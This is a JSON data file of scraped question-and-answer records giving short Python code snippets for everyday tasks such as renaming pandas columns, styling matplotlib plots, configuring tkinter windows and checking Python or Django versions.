    "description": "from sklearn.impute import SimpleImputer  imputer = SimpleImputer(missing_values=np.nan, strategy='mean') \nfrom sklearn.impute import SimpleImputer imputer = SimpleImputer(missing_values=np.nan, strategy='mean') \n",
    "reg_date": "2021-10-12T11:28:09.000Z"
  },
  {
    "id": 406,
    "keyword": null,
    "link": null,
    "title": " cap.release() not working",
    "description": "pip install opencv-contrib-python\n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 407,
    "keyword": null,
    "link": null,
    "title": " capitalize string python",
    "description": "# Python string capitalization string = \"this isn't a #Standard Sntence.\" string.capitalize() # \"This isn't a #standard sentence.\" string.upper() # \"THIS ISN'T A #STANDARD SENTENCE.\" string.lower() # \"this isn't a #standard sentence.\" string.title() # \"This Isn'T A #Standard Sentence.\"  # ---------- Alternate Title Case ---------- # \"This Isn't A #standard Sentence.\"  from string import capwords string = capwords(string) # capitalize characters after each separator. # see the doc: string.capwords(s, sep=None), separator defaults to space  # or implement it directly: string = \" \".join(s.capitalize() for s in string.split()) #\nstring=str(\"caPiTalIZE\") print(string.capitalize()) \t#output : Capitalize\nmessage=\"hi\" print(message) print(message.upper())\nstring_name.capitalize() \n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 408,
    "keyword": null,
    "link": null,
    "title": " cartesian product of a list python",
    "description": "import itertools  somelists = [    [1, 2, 3],    ['a', 'b'],    [4, 5] ] for element in itertools.product(*somelists):     print(element) \n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 409,
    "keyword": null,
    "link": null,
    "title": " case statement in pandas",
    "description": "# If the row value in column 'is_blue' is 1  # Change the row value to 'Yes'  # otherwise change it to 'No' df['is_blue'] = df['is_blue'].apply(lambda x: 'Yes' if (x == 1) else 'No')  # or you can use np.where df['is_blue'] = np.where(df['is_blue'] == 1, 'Yes', 'No') # You can also use mapping to accomplish the same result # Warning: Mapping only works once on the same column creates NaN's otherwise df['is_blue'] = df['is_blue'].map({0: 'No', 1: 'Yes'})  \ndf['c'] = np.select( [     (df['a'].isnull() & (df['b'] == 0)) ],  [     1 ],  default=0 ) \n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 410,
    "keyword": null,
    "link": null,
    "title": " change axis and axis label color matplotlib",
    "description": "import matplotlib.pyplot as plt  fig = plt.figure() ax = fig.add_subplot(111)  ax.plot(range(10)) ax.set_xlabel('X-axis') ax.set_ylabel('Y-axis')  ax.spines['bottom'].set_color('red') ax.spines['top'].set_color('red') ax.xaxis.label.set_color('red') ax.tick_params(axis='x', colors='red')  plt.show()\n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 411,
    "keyword": null,
    "link": null,
    "title": " change background color of tkinter",
    "description": "root.configure(background='black')\n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 412,
    "keyword": null,
    "link": null,
    "title": " change column name df",
    "description": "import pandas as pd data = pd.read_csv(file) data.rename(columns={'original':'new_name'}, inplace=True)\ndf = df.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}) \ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\n>>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \ndf = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]})  # Option 1 df.rename({\"A\": \"a\", \"B\": \"c\"}, axis=1)  # Option 2 df.rename(columns={\"A\": \"a\", \"B\": \"c\"})  # Result    a  c 0  1  4 1  2  5 2  3  6\n>>> df.rename({1: 2, 2: 4}, axis='index')    A  B 0  1  4 2  2  5 4  3  6 \n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 413,
    "keyword": null,
    "link": null,
    "title": " change column order dataframe python",
    "description": "# create a dataframe df = pd.DataFrame({'B':[1,2],'A':[0,0],'C':[1,1]}) # reorder columns as ['A','B','C'] df = df.reindex(columns = ['A','B','C'])\ndf = df.reindex(columns=column_names)\ncols = df.columns.tolist() cols = cols[-1:] + cols[:-1] #bring last element to 1st position df = df.reindex(cols, axis=1)\ncols = df.columns.tolist() # Rearrange the list any way you want cols = cols[-1:] + cols[:-1] df = df[cols]\nYou could also do something like this:  df = df[['mean', '0', '1', '2', '3']] You can get the list of columns with:  cols = list(df.columns.values) The output will produce:  ['0', '1', '2', '3', 'mean']\n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 414,
    "keyword": null,
    "link": null,
    "title": " change column value based on another column pandas",
    "description": "# Changes the 'is_electric' column based on value in the 'type' column # If the 'type' column == 'electric' then the 'is_electric' becomes 'YES' df['is_electric']= df['type'].apply(lambda x: 'YES' if (x == 'electric') else 'NO') \nimport pandas df = pandas.read_csv(\"test.csv\") df.loc[df.ID == 103, 'FirstName'] = \"Matt\" df.loc[df.ID == 103, 'LastName'] = \"Jones\"\n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 415,
    "keyword": null,
    "link": null,
    "title": " change dataframe column type",
    "description": "# You can use \"astype\" method # suppose you want to correct your \"sales\" column data type df['sales'] = df['sales'].astype('float64')\n>>> df.astype({'col1': 'int32'}).dtypes col1    int32 col2    int64 dtype: object\ndf.astype(int)\ndf = pd.read_csv(\"weather.tsv\", sep=\"\\t\",                    dtype={'Day': str,'Wind':int64}) df.dtypes \n",
    "reg_date": "2021-10-12T11:28:10.000Z"
  },
  {
    "id": 416,
    "keyword": null,
    "link": null,
    "title": " change default python version mac",
    "description": "#install or update brew $ brew install pyenv #install $ pyenv install 3.7.3 #make default $ pyenv global 3.7.3 # and verify $ pyenv version 3.7.3 (set by /Users/mbbroberg/.pyenv/version) $ echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\\n  eval \"$(pyenv init -)\"\\nfi' >> ~/.bash_profile #reset the current shell $ exec $0  $ which python #/Users/mbbroberg/.pyenv/shims/python $ python -V $ pip -V #pip 19.0.3 from /Users/mbbroberg/.pyenv/versions/3.7.3/lib/python3.7/site-packages/pip (python 3.7)\nln -s -f /usr/local/bin/python3.7 /usr/local/bin/python \n# it is said not to do but I used it anyway, because of the conveniency $ echo \"alias python=/usr/local/bin/python3.7\" >> ~/.zshrc \n$ pyenv global 3.7.3 # and verify it worked  $ pyenv version 3.7.3 (set by /Users/mbbroberg/.pyenv/version)\n[ -e ~/.profile ] && . ~/.profile \n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 417,
    "keyword": null,
    "link": null,
    "title": " change django administration title",
    "description": "#In the project urls.py file admin.site.site_header = \"Admin Portal\" admin.site.site_title = \"Admin Portal\" admin.site.index_title = \"Welcome to Portal\"\nadmin.site.site_header = \"UMSRA Admin\" admin.site.site_title = \"UMSRA Admin Portal\" admin.site.index_title = \"Welcome to UMSRA Researcher Portal\" \n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 418,
    "keyword": null,
    "link": null,
    "title": " change false to true python",
    "description": "flag = False print(flag) # False flag = not flag print(flag) # True\n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 419,
    "keyword": null,
    "link": null,
    "title": " change figure size pandas",
    "description": "df['column_name'].plot(figsize=(15, 10))\n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 420,
    "keyword": null,
    "link": null,
    "title": " change freq of date index in pandas",
    "description": "#Change freq of df DateTimeIndex into a monthly freq df.asfreq('M')\n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 421,
    "keyword": null,
    "link": null,
    "title": " change graph colors python matplotlib",
    "description": "plt.plot([values], color='color')\n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 422,
    "keyword": null,
    "link": null,
    "title": " change list to int in python",
    "description": "test_list = list(map(int,test_list))\n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 423,
    "keyword": null,
    "link": null,
    "title": " change name of axis matplotlib",
    "description": "plt.xlabel('X axis') plt.ylabel('Y axis')\n",
    "reg_date": "2021-10-12T11:28:11.000Z"
  },
  {
    "id": 424,
    "keyword": null,
    "link": null,
    "title": " change name of column pandas",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\n#df.rename() will only return a new df with the new headers #df = df.rename() will change the heders of the current dataframe  df = df.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf.rename({\"current\": \"updated\"}, axis=1, inplace=True) print(df.dtypes)\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 425,
    "keyword": null,
    "link": null,
    "title": " change pandas column value based on condition",
    "description": "In [41]: df.loc[df['First Season'] > 1990, 'First Season'] = 1 df  Out[41]:                  Team  First Season  Total Games 0      Dallas Cowboys          1960          894 1       Chicago Bears          1920         1357 2   Green Bay Packers          1921         1339 3      Miami Dolphins          1966          792 4    Baltimore Ravens             1          326 5  San Franciso 49ers          1950         1003\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 426,
    "keyword": null,
    "link": null,
    "title": " change pyplot dpi",
    "description": "plt.imshow(img) plt.gcf().set_dpi(300) plt.show() \n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 427,
    "keyword": null,
    "link": null,
    "title": " change python version in conda environment",
    "description": "conda install python=3.7\n conda search python  conda install python=3.6.2\n conda install python=3.5.0   # or maybe    conda install python=2.7.8   # or whatever you want.... \nconda activate my_env conda install python=3.6\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 428,
    "keyword": null,
    "link": null,
    "title": " change size of selenium window",
    "description": "        options = webdriver.ChromeOptions()         options.add_argument(\"--window-size=1100,1000\")\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 429,
    "keyword": null,
    "link": null,
    "title": " change specific column name pandas",
    "description": "df_new = df.rename(columns={'A': 'a'}) #change a from A\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\ndf.rename(columns={'old_name': 'new_name'}, inplace=True)\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 430,
    "keyword": null,
    "link": null,
    "title": " change string list to int list python",
    "description": "test_list = ['1', '4', '3', '6', '7']   int_list = [int(i) for i in test_list]\nUse the map function (in Python 2.x): results = map(int, results)  In Python 3, you will need to convert the result from map to a list: results = list(map(int, results))\nresults = map(int, results) \ntest_list = ['1', '4', '3', '6', '7']     # Printing original list  print (\"Original list is : \" + str(test_list))     # using naive method to  # perform conversion  for i in range(0, len(test_list)):      test_list[i] = int(test_list[i])            # Printing modified list   print (\"Modified list is : \" + str(test_list))  \nresults = [int(i) for i in results]\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 431,
    "keyword": null,
    "link": null,
    "title": " change text color docx-python",
    "description": "from docx import Document from docx.shared import RGBColor document = Document() run = document.add_paragraph().add_run('some text') font = run.font font.color.rgb = RGBColor(0x42, 0x24, 0xE9) p=document.add_paragraph('aaa') document.save('demo1.docx')\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 432,
    "keyword": null,
    "link": null,
    "title": " change the color of the button on hovering tkinter",
    "description": "import tkinter as tk  def on_enter(e):     myButton['background'] = 'green'  def on_leave(e):     myButton['background'] = 'SystemButtonFace'  root = tk.Tk() myButton = tk.Button(root,text=\"Click Me\") myButton.grid()   myButton.bind(\"<Enter>\", on_enter) myButton.bind(\"<Leave>\", on_leave)  root.mainloop() \nimport tkinter as tk  class HoverButton(tk.Button):     def __init__(self, master, **kw):         tk.Button.__init__(self,master=master,**kw)         self.defaultBackground = self[\"background\"]         self.bind(\"<Enter>\", self.on_enter)         self.bind(\"<Leave>\", self.on_leave)      def on_enter(self, e):         self['background'] = self['activebackground']      def on_leave(self, e):         self['background'] = self.defaultBackground  root = tk.Tk()  classButton = HoverButton(root,text=\"Classy Button\", activebackground='green') classButton.grid()  root.mainloop() \n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 433,
    "keyword": null,
    "link": null,
    "title": " change the current working directory in python",
    "description": "import os  path = os.getcwd()  print(path) # /Users/mbp/Documents/my-project/python-snippets/notebook  print(type(path)) # <class 'str'> \nimport os os.getcwd() \nimport os cdir = os.getcwd() # it will return current working directory print(\"Previous_dir\",cdir) # Previous_dir C:\\Users\\..\\Desktop\\python os.chdir('C:/Users/../Desktop/desire_folder') #chdir used for change direcotry print(\"Current_dir\",cdir) # Current_dir C:\\Users\\..\\Desktop\\python\\teamspirit\n",
    "reg_date": "2021-10-12T11:28:12.000Z"
  },
  {
    "id": 434,
    "keyword": null,
    "link": null,
    "title": " change the default python version mac",
    "description": "#install or update brew $ brew install pyenv #install $ pyenv install 3.7.3 #make default $ pyenv global 3.7.3 # and verify $ pyenv version 3.7.3 (set by /Users/mbbroberg/.pyenv/version) $ echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\\n  eval \"$(pyenv init -)\"\\nfi' >> ~/.bash_profile #reset the current shell $ exec $0  $ which python #/Users/mbbroberg/.pyenv/shims/python $ python -V $ pip -V #pip 19.0.3 from /Users/mbbroberg/.pyenv/versions/3.7.3/lib/python3.7/site-packages/pip (python 3.7)\nln -s -f /usr/local/bin/python3.7 /usr/local/bin/python \n# it is said not to do but I used it anyway, because of the conveniency $ echo \"alias python=/usr/local/bin/python3.7\" >> ~/.zshrc \n[ -e ~/.profile ] && . ~/.profile \n",
    "reg_date": "2021-10-12T11:28:13.000Z"
  },
  {
    "id": 435,
    "keyword": null,
    "link": null,
    "title": " change ticks font size matplotlib python",
    "description": "from matplotlib import pyplot as plt from datetime import datetime, timedelta  xvalues = range(10) yvalues = xvalues  fig,ax = plt.subplots() plt.plot(xvalues, yvalues)  plt.xticks(fontsize=16) # sets font size of xticks to 16 (respective of yticks)  plt.grid(True)  plt.show() \n",
    "reg_date": "2021-10-12T11:28:13.000Z"
  },
  {
    "id": 436,
    "keyword": null,
    "link": null,
    "title": " change tkinter window name",
    "description": " windowName.title('Window Title')  #Example import tkinter window = tkinter.Tk() window.title('My Title')\nfrom tkinter import *     root = Tk() root.title(\"Calculas\")  root.mainloop()\n",
    "reg_date": "2021-10-12T11:28:13.000Z"
  },
  {
    "id": 437,
    "keyword": null,
    "link": null,
    "title": " change type of array python",
    "description": "arr=arr.astype('uint8') \n",
    "reg_date": "2021-10-12T11:28:13.000Z"
  },
  {
    "id": 438,
    "keyword": null,
    "link": null,
    "title": " change value in pandas dataframe cell",
    "description": "df.loc[row_or_index, column_name] = value\n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 439,
    "keyword": null,
    "link": null,
    "title": " change value to string pandas",
    "description": "mtrx['X.3'] = mtrx['X.3'].astype(str)\n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 440,
    "keyword": null,
    "link": null,
    "title": " changes not showing on website server odoo",
    "description": " had a similar problem and I could solve it by eliminating  the QWeb Template from Settings --> Technical --> User Interface --> Views.  Then, you need to update the module.    I hope I've helped :)\nupdate     ir_model_data set     noupdate = false where     id in(         select             model_data_id         from             ir_ui_view         where             name = '<the name of your template - in my case tpl-imprint>'     ); \n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 441,
    "keyword": null,
    "link": null,
    "title": " changing instance through dict changes all instances",
    "description": "class Myclass: \tSOME_ARRAY = []     def __init__(self):       self.SOME_ARRAY2 = []      #SOME_ARRAY has the same adress across all instances of the class. #SOME_ARRAY2 has a specific adress for each instance\n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 442,
    "keyword": null,
    "link": null,
    "title": " char to binary python",
    "description": ">>> st = \"hello world\" >>> ' '.join(format(ord(x), 'b') for x in st) '1101000 1100101 1101100 1101100 1101111 100000 1110111 1101111 1110010 1101100 1100100'  #using `bytearray` >>> ' '.join(format(x, 'b') for x in bytearray(st, 'utf-8')) '1101000 1100101 1101100 1101100 1101111 100000 1110111 1101111 1110010 1101100 1100100'\nlet binary = 0001 parseInt(binary, 2) // returns 1\n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 443,
    "keyword": null,
    "link": null,
    "title": " charmap codec can't encode character",
    "description": "with open(filename_csv , 'w', newline='',encoding=\"utf-8\") as csv_file:\n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 444,
    "keyword": null,
    "link": null,
    "title": " chech box in tkinter",
    "description": "from tkinter import * master = Tk() var1 = IntVar() Checkbutton(master, text=\"male\", variable=var1).grid(row=0, sticky=W) var2 = IntVar() Checkbutton(master, text=\"female\", variable=var2).grid(row=1, sticky=W) mainloop() \n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 445,
    "keyword": null,
    "link": null,
    "title": " check 32 or 64 bit python",
    "description": "import sys sys.maxsize > 2**32  # it should display True in case of 64bit and False in case of 32bit\n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 446,
    "keyword": null,
    "link": null,
    "title": " check all python versions ubuntu",
    "description": "# View as version vise: for p in $(compgen -c python); do printf \"%-16s\" $p; $p --version; done python2.7      Python 2.7.6 python3.4m     Python 3.4.3  # view as: $ compgen -c python python2.7 python3.4m\n# check all python version install in ubuntu $ ls /usr/bin/python* # for path and version $ whereis python # for path and version $ which python # for path $ ls -lach /usr/bin/python $ for p in $(compgen -c python); do printf \"%-16s\" $p; $p --version; done\n",
    "reg_date": "2021-10-12T11:28:14.000Z"
  },
  {
    "id": 447,
    "keyword": null,
    "link": null,
    "title": " check corently installed epython version",
    "description": "python3 --version\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 448,
    "keyword": null,
    "link": null,
    "title": " check dictionary is empty or not in python",
    "description": "test_dict = {}  if not test_dict:     print \"Dict is Empty\"   if not bool(test_dict):     print \"Dict is Empty\"   if len(test_dict) == 0:     print \"Dict is Empty\"\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 449,
    "keyword": null,
    "link": null,
    "title": " check django object exists",
    "description": "modelName.objects.filter(pk='id').exists()\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 450,
    "keyword": null,
    "link": null,
    "title": " check django version",
    "description": "python -m django --version\n$ django-admin.py version\npython3 -m django --version // mac py -m django --version // windows\npip list\nimport django django.VERSION\n>>> import django >>> django.VERSION (2, 0, 0, 'final', 0)\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 451,
    "keyword": null,
    "link": null,
    "title": " check empty dataframe",
    "description": "newDF = pd.DataFrame() #creates a new dataframe that's empty newDF = newDF.append(oldDF, ignore_index = True) # ignoring index is optional # try printing some data from newDF print newDF.head() #again optional \ndf.empty == True\ndf_empty = pd.DataFrame({'A' : []}) df_empty.empty # True\n# Create Empty DataFrame with column names df = pd.DataFrame(columns=['species','name','age']) df.loc[1] = ['dog','Fido','3']  # Populate Row at index 1 (row 1) df.loc[2] = ['cat','Felix','2'] # Populate Row at index 2 (row 2) print(df)  # Output: #   species   name age # 1     dog   Fido   3 # 2     cat  Felix   2\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 452,
    "keyword": null,
    "link": null,
    "title": " check gpu in tensorflow",
    "description": "import tensorflow as tf print(tf.test.gpu_device_name())\n# As it's written in Tensorflow documentatoin:   import tensorflow as tf print(\"Num GPUs Available: \", len(tf.config.experimental.list_physical_devices('GPU')))\ntf.test.is_gpu_available(   cuda_only=False, min_cuda_compute_capability=None )\n# For tensorflow 2: print(\"Num GPUs Available: \", len(tf.config.list_physical_devices('GPU')))  # For tensorflow 1: sess = tf.Session(config=tf.ConfigProto(log_device_placement=True))\n$ pip uninstall tensorflow $ pip install tensorflow-gpu \n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 453,
    "keyword": null,
    "link": null,
    "title": " check if a list contains an item from another list python",
    "description": "## checking any elment of list_B in list_A list_A = [1, 2, 3, 4]  list_B = [2, 3, 6]  check = any(item in list_A for item in list_B)  print(check) # True\n## checking all elements of list_B in list_A list_A = [1, 2, 3, 4] list_B = [2, 3]  check = all(item in list_A for item in list_B)  print(check) # True\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 454,
    "keyword": null,
    "link": null,
    "title": " check if a number is perfect cube in python",
    "description": "x = int(input()) print(int(round(x ** (1. / 3))) ** 3 == x)\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 455,
    "keyword": null,
    "link": null,
    "title": " check if a value in dataframe is nan",
    "description": "df[df.isnull().any(axis=1)]\n#return a subset of the dataframe where the column name value == NaN  df.loc[df['column name'].isnull() == True] \n# to mark NaN column as True df['your column name'].isnull() \n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 456,
    "keyword": null,
    "link": null,
    "title": " check if an application is running python",
    "description": "#Iterates through all the programs running in your system and checks for the one in the string import psutil     \"someProgram\" in (p.name() for p in psutil.process_iter())\n",
    "reg_date": "2021-10-12T11:28:15.000Z"
  },
  {
    "id": 457,
    "keyword": null,
    "link": null,
    "title": " check if any value is null in pandas dataframe",
    "description": "df.isnull().values.any() \n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 458,
    "keyword": null,
    "link": null,
    "title": " check if any values overlap in numpy array",
    "description": "import numpy as np array_1 = np.array(((1, 2, 3), (4, 5, 6), (7, 8, 9))) array_2 = np.array(((3, 1, 2), (5, 4, 6), (7, 9, 8))) #In this example, array_2 does have some of the same elements(i.e. the 6s and 7s are in the same place) #This means that when we check if any of their elements are the same, we will get True. print(np.any(array_1 == array_2)) #output is True print(np.all(array_1 == array_2)) #output is False\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 459,
    "keyword": null,
    "link": null,
    "title": " check if coroutine python",
    "description": "import asyncio  asyncio.iscoroutine(obj) asyncio.iscoroutinefunction(function)\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 460,
    "keyword": null,
    "link": null,
    "title": " check if image is empty opencv python",
    "description": "if (type(img) is np.ndarray):       #do stuff with image\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 461,
    "keyword": null,
    "link": null,
    "title": " check if list of list python",
    "description": "for item in list_of_lists:       isinstance(item, list)\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 462,
    "keyword": null,
    "link": null,
    "title": " check if number is power of 2 python",
    "description": "def is_power_of_two(number : int) -> bool:     while number != 1:         if number % 2:             return False         number /= 2     return True\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 463,
    "keyword": null,
    "link": null,
    "title": " check if part of list is in another list python",
    "description": "'''         check if list1 contains any elements of list2 ''' result =  any(elem in list1  for elem in list2) if result:     print(\"Yes, list1 contains any elements of list2\")     else :     print(\"No, list1 contains any elements of list2\")\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 464,
    "keyword": null,
    "link": null,
    "title": " check if pytorch is using gpu minimal example",
    "description": "import torch import torch.nn as nn dev = torch.device(\"cuda\") if torch.cuda.is_available() else torch.device(\"cpu\") t1 = torch.randn(1,2) t2 = torch.randn(1,2).to(dev) print(t1)  # tensor([[-0.2678,  1.9252]]) print(t2)  # tensor([[ 0.5117, -3.6247]], device='cuda:0') t1.to(dev)  print(t1)  # tensor([[-0.2678,  1.9252]])  print(t1.is_cuda) # False t1 = t1.to(dev) print(t1)  # tensor([[-0.2678,  1.9252]], device='cuda:0')  print(t1.is_cuda) # True  class M(nn.Module):     def __init__(self):                 super().__init__()                 self.l1 = nn.Linear(1,2)      def forward(self, x):                               x = self.l1(x)         return x model = M()   # not on cuda model.to(dev) # is on cuda (all parameters) print(next(model.parameters()).is_cuda) # True\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 465,
    "keyword": null,
    "link": null,
    "title": " check if response is 200 python",
    "description": "from datetime import datetime my_dates = ['5-Nov-18', '25-Mar-17', '1-Nov-18', '7-Mar-17'] my_dates.sort(key=lambda date: datetime.strptime(date, \"%d-%b-%y\")) print(my_dates)\nif resp.status_code == 200:     print ('OK!') else:     print ('Boo!') \n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 466,
    "keyword": null,
    "link": null,
    "title": " check if special character in string python",
    "description": "string = \"Daneshwar$/?$Daneshwar\" regex = re.compile('[@_!#$%^&*()<>?/\\|}{~:]') if(regex.search(string) == None): \tprint(\"special is absent\") else: \tprint(\"present\")\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 467,
    "keyword": null,
    "link": null,
    "title": " check if string can be converted to int python",
    "description": "# CHECKING IF INT variable='3' try:     int(variable)     # this will execute if it is integer     print('You typed an int') except ValueError:   \t# otherwise this will execute     print('You did not type an int')  # CHECKING IF FLOAT variable='3' try:     float(variable)     print('You typed a float') except ValueError:     print('You did not type a float')\ntry:     float(element) except ValueError:     print \"Not a float\"\nif element.isdigit():   newelement = int(element)\ndef isfloat(value):   try:     float(value)     return True   except ValueError:     return False\n",
    "reg_date": "2021-10-12T11:28:16.000Z"
  },
  {
    "id": 468,
    "keyword": null,
    "link": null,
    "title": " check if string is url python",
    "description": "#USE requests.get() TO CHECK IF A STRING IS A URL  try:     response = requests.get(\"http://www.avalidurl.com/\")     print(\"URL is valid and exists on the internet\") except requests.ConnectionError as exception:     print(\"URL does not exist on Internet\") OUTPUT URL does not exist on Internet   #URLValidator() ensures a value looks like a URL,  #but does not check if the URL exists on the internet.  #To check if the URL exists on the internet, call requests.get(url)  #in a try-statement to make a GET request from the source url and return a  #Response object containing the server's response to the request.  #If the URL does not exist on the internet, it raises a ConnectionError and  #the program continues to the except-statement.\nfrom django.core.validators import URLValidator() validate = URLValidator()  try:     validate(\"http://www.avalidurl.com/\")     print(\"String is a valid URL\") except ValidationError as exception:     print(\"String is not valid URL\")\n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 469,
    "keyword": null,
    "link": null,
    "title": " check if tensorflow gpu is installed",
    "description": "import tensorflow as tf print(tf.test.gpu_device_name())\ntf.config.list_physical_devices('GPU')\n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 470,
    "keyword": null,
    "link": null,
    "title": " check if user has manage messages discord.py",
    "description": "@client.event async def on_message(message):   message.author.guild_permissions.manage_messages # returns bool\n@bot.command() @has_permissions(kick_members=True)   async def kick(self, ctx, Member: discord.Member):           await bot.kick(Member)  @kick.error async def kick_error(error, ctx):    if isinstance(error, MissingPermissions):        await ctx.send(\"You don't have permission to do that!\")\n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 471,
    "keyword": null,
    "link": null,
    "title": " check if user log in flask",
    "description": "from flask_login import current_user  @app.route(...) def your_route():     return current_user.is_authenticated\n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 472,
    "keyword": null,
    "link": null,
    "title": " check key pressed pygame",
    "description": "import pygame events = pygame.event.get() for event in events:     if event.type == pygame.KEYDOWN:         if event.key == pygame.K_LEFT:             location -= 1         if event.key == pygame.K_RIGHT:             location += 1 \n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 473,
    "keyword": null,
    "link": null,
    "title": " check odd numbers numpy",
    "description": "# Input arr = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]) arr[arr % 2 == 1] #> array([1, 3, 5, 7, 9]) \n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 474,
    "keyword": null,
    "link": null,
    "title": " check pip version",
    "description": "pip --version\npip -V\nFile\"stdin\",line 1  pip list  Syntax Error: invalid syntax\npip show module name\ncheck pip \n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 475,
    "keyword": null,
    "link": null,
    "title": " check python 32 or 64",
    "description": "import sys sys.maxsize > 2**32  # it should display True in case of 64bit and False in case of 32bit\n# from your Windows/Linux shell run: python -c \"import sys; print(sys.maxsize > 2**32);\" # True --> 64 bits, False --> 32 bits\nimport struct print(struct.calcsize(\"P\")*8)\n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 476,
    "keyword": null,
    "link": null,
    "title": " check python version",
    "description": "# To check your Python version in the command line use: python --version  # To check your Python verson inside a script use: import sys print(sys.version)\n# in python $ python --version  # in python3 $ python3 --version\npython --version\n# 2 ways to check python version # In the terminal/cmd write the following:  # Way 1 python -V  # Way 2 python -c \"import sys; print(sys.version)\"\n# To check Python version  python -V ----or---- python --version\npython3 --versionpip3 --version\n",
    "reg_date": "2021-10-12T11:28:17.000Z"
  },
  {
    "id": 477,
    "keyword": null,
    "link": null,
    "title": " check python version colab",
    "description": "# -------------------------------------- # OUTPUT 19/07/2021: 3.7.11 # -------------------------------------- import sys print(sys.version) # ----------------------[alternative]--- !python --version  # checks version from command line  \n",
    "reg_date": "2021-10-12T11:28:18.000Z"
  },
  {
    "id": 478,
    "keyword": null,
    "link": null,
    "title": " check python version mac",
